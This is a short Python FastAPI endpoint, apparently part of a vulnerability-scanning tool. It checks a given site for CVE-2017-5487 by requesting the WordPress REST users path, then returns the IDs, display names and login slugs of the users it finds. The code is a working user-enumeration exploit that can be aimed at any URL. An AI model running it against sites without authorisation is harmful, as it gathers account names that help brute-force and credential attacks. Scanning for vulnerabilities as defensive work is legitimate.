from fastapi import APIRouter, HTTPException
from typing import Dict
import json
from ..models.url_input import Url_Input
import requests

router = APIRouter()
tags_cve_2017_5487  = "CVE-2017-5487"


@router.post("/check-vuln-cve-2017-5487" , tags=[tags_cve_2017_5487])
async def scan_cve_2017_5487(input_data: Url_Input):
    url = input_data.url
    payload = "/wp-json/wp/v2/users/"

    try:
        url_exploit = requests.get(url + payload)
        url_exploit.raise_for_status()
    except requests.exceptions.RequestException:
        raise HTTPException(status_code=404, detail="Không tìm thấy dữ liệu từ website này")

    try:
        json_data = url_exploit.json()  # Lấy dữ liệu JSON từ phản hồi
        if not json_data:
            return {"message": "No users found"}
    except json.JSONDecodeError:
        return {"message": "Invalid JSON data"}

    users_info = []
    for user in json_data:
        users_info.append(
            {
                "ID": user.get("id", "N/A"),
                "Name": user.get("name", "N/A"),
                "User": user.get("slug", "N/A"),
            }
        )

    return {"message": "Users information scanned successfully", "users": users_info}
